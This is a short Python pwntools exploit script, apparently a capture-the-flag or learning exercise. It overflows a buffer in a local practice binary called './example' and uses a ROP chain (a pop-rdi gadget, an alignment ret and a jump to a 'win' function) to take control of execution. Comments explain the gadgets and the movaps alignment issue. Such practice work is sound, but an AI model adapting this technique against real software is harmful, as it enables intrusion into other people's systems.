from pwn import *


#context.quiet()
context.clear(log_level='WARNING')
#context.clear(log_level='INFO')
#context.clear(log_level='DEBUG')


p = process('./example')


'''
#run: ./bingaj ./example

and got (with other things):
pop rdi - 0x40126c

0x40101a: ret

'''

pop_rdi_addr = 0x40126c

win_addr = 0x401196

ret_addr = 0x40101a 

ROP_injection = b''.join([
    b'A'*18,
    p64(pop_rdi_addr), #pop rdi; ret
    p64(1), #this is what is going to be in rdi
    p64(ret_addr), #this shows why sometimes we just need to add a RET (read movaps)
    p64(win_addr)
    ])

#p.recvuntil(b'enter your name:')
p.sendline(ROP_injection)

p.interactive()


p.close()
